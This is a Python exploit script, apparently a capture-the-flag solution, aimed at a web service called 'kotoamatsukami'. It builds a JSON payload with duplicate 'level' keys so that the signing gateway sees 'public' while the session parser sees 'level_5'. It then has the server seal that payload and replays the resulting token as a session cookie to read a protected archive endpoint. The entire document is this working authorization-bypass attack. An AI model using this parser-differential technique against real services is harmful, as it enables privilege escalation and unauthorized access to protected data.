import urllib.request
import json

BASE_URL = "https://kotoamatsukami-zcgb4f64hq-el.a.run.app"

# 1. We want the session parser to see: user="guest", level="level_5"
# 2. We want the Verification Gateway to see: action="request_access", subject="guest", level="public"

payload_str = '{"action": "request_access", "subject": "guest", "level": "public", "level": "level_5", "user": "guest"}'

print(f"Payload to seal: {payload_str}")

# Seal
req = urllib.request.Request(
    f"{BASE_URL}/api/seal",
    data=payload_str.encode('utf-8'),
    headers={"Content-Type": "application/json"},
    method="POST"
)
try:
    with urllib.request.urlopen(req) as response:
        res_data = json.loads(response.read().decode('utf-8'))
        token = res_data.get("token")
        print(f"Token obtained: {token}")
except Exception as e:
    print(f"Seal FAILED: {e}")
    exit(1)

# Now, we use the token directly as our 'session' cookie!
print("\nAttempting to access archive using the token as the session cookie...")
req_archive = urllib.request.Request(
    f"{BASE_URL}/api/archive",
    headers={"Cookie": f"session={token}"},
    method="GET"
)
try:
    with urllib.request.urlopen(req_archive) as response:
        archive_content = response.read().decode('utf-8')
        print(f"SUCCESS! Archive Content:\n{archive_content}")
except urllib.error.HTTPError as e:
    print(f"FAILED: {e.code} - {e.read().decode('utf-8')}")
except Exception as e:
    print(f"Error: {e}")
